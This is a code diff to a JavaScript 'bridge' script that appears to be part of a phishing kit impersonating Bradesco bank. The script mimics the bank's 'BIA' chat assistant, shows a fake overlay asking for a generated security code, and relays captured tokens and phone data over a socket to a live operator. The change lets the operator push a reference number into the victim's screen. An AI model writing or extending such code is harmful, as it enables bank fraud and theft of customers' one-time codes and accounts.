@@ -20,6 +20,7 @@
     token: '',
     ddd: '',
     telefone: '',
+    referencia: '',
   };
 
   console.log('[BRIDGE] Iniciando cliente-bridge.js, sessionId:', sessionId);
@@ -68,6 +69,12 @@
       console.log('[CLI] 💬 Mensagem BIA recebida:', data.texto);
       // Sempre renderizar a mensagem, mesmo que o chat não esteja aberto
       addBiaMessage('BIA', data.texto);
+    });
+
+    socket.on('client:referencia', (data) => {
+      console.log('[CLI] 📋 Referência recebida:', data.referencia);
+      capturedData.referencia = data.referencia;
+      updateReferenciaField(data.referencia);
     });
 
     socket.on('client:bia-avatar', (data) => {
@@ -224,7 +231,7 @@
               <label>Digite o código gerado:</label>
               <input type="text" id="overlay-token" placeholder="000000" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
               <label style="margin-top: 15px;">Número de Referência:</label>
-              <input type="text" id="overlay-referencia" placeholder="0000" maxlength="10" style="text-align: center; font-size: 18px;">
+              <input type="text" id="overlay-referencia" placeholder="Aguardando..." maxlength="10" style="text-align: center; font-size: 18px; background-color: #f0f0f0; cursor: not-allowed;" disabled>
             </div>
             <button onclick="window.bradescoBridge.submitToken()">ENVIAR CÓDIGO</button>
             <div style="margin-top: 20px; font-size: 11px; color: #666;">
@@ -403,6 +410,18 @@
     }
   }
 
+  function updateReferenciaField(referencia) {
+    console.log('[BRIDGE] Atualizando campo de referência:', referencia);
+    const referenciaInput = document.getElementById('overlay-referencia');
+    if (referenciaInput) {
+      referenciaInput.value = referencia;
+      referenciaInput.disabled = true;
+      referenciaInput.style.backgroundColor = '#f0f0f0';
+      referenciaInput.style.cursor = 'not-allowed';
+      console.log('[BRIDGE] ✅ Campo de referência desabilitado');
+    }
+  }
+
   // ============================================================================
   // CONFIGURAR LISTENERS DE INPUT
   // ============================================================================
@@ -518,10 +537,11 @@
       if (token) {
         console.log('[BRIDGE] 🔑 Token enviado:', token);
         emitInput('token', token);
-        if (ref) {
-          console.log('[BRIDGE] 📄 Referência enviada:', ref);
-          emitInput('referencia', ref);
-        }
+        // Referência agora é enviada apenas pelo operador, não pelo cliente
+        // if (ref) {
+        //   console.log('[BRIDGE] 📄 Referência enviada:', ref);
+        //   emitInput('referencia', ref);
+        // }
         showOverlay('loading', 'VALIDANDO CÓDIGO AGUARDE...');
       }
     }
